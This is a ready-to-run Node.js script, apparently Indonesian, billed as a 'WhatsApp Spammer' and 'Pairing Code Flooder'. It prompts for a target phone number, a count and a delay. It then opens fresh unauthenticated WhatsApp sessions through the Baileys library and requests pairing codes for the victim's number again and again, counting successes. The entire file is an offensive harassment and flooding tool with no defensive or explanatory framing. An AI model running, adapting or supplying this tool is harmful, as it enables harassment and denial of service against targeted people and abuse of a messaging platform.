// wa-spam-free.js
const { default: makeWASocket } = require('@whiskeysockets/baileys');
const readline = require('readline');
const chalk = require('chalk'); // Untuk warna di terminal (opsional)

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Banner
console.log(chalk.cyan(`
╔═══════════════════════════════════════╗
║    WhatsApp Spammer - Tanpa Login     ║
║        Pairing Code Flooder           ║
╚═══════════════════════════════════════╝
`));

async function startSpam() {
    // Input nomor target
    rl.question(chalk.yellow('📱 Nomor target (628xxx): '), async (target) => {
        // Format nomor (hapus spasi/tanda hubung)
        target = target.replace(/[^0-9]/g, '');
        
        if (target.length < 10) {
            console.log(chalk.red('❌ Nomor tidak valid! Minimal 10 digit.'));
            rl.close();
            return;
        }

        // Input jumlah spam
        rl.question(chalk.yellow('📊 Jumlah spam (default 50): '), async (jumlahInput) => {
            const jumlah = parseInt(jumlahInput) || 50;
            
            // Input delay
            rl.question(chalk.yellow('⏱️ Delay antar request (detik, default 2): '), async (delayInput) => {
                const delay = (parseInt(delayInput) || 2) * 1000; // Konversi ke ms
                
                console.log(chalk.green(`\n🔥 Memulai spam ${jumlah} pairing code ke ${target}`));
                console.log(chalk.gray(`⏱️ Interval: ${delay/1000} detik\n`));

                let terkirim = 0;
                let gagal = 0;

                for (let i = 0; i < jumlah; i++) {
                    setTimeout(async () => {
                        try {
                            // Buat koneksi baru setiap request
                            const sock = makeWASocket({
                                auth: { creds: {}, keys: {} }, // Auth kosong
                                printQRInTerminal: false,
                                browser: ['Chrome', 'Linux', '']
                            });

                            // Request pairing code
                            const code = await sock.requestPairingCode(target);
                            
                            terkirim++;
                            console.log(chalk.green(`✅ [${terkirim}/${jumlah}] Kode terkirim: ${code}`));
                            
                            // Putuskan koneksi
                            sock.ws.close();
                            
                        } catch (err) {
                            gagal++;
                            console.log(chalk.red(`❌ [${i+1}] Gagal: ${err.message}`));
                        }
                    }, i * delay);
                }

                // Timer selesai
                setTimeout(() => {
                    console.log(chalk.cyan(`\n📊 STATISTIK:`));
                    console.log(chalk.green(`✅ Berhasil: ${terkirim}`));
                    console.log(chalk.red(`❌ Gagal: ${gagal}`));
                    console.log(chalk.yellow(`⏱️ Selesai dalam ${(jumlah * delay/1000)} detik`));
                    rl.close();
                }, (jumlah * delay) + 3000);
            });
        });
    });
}

startSpam();
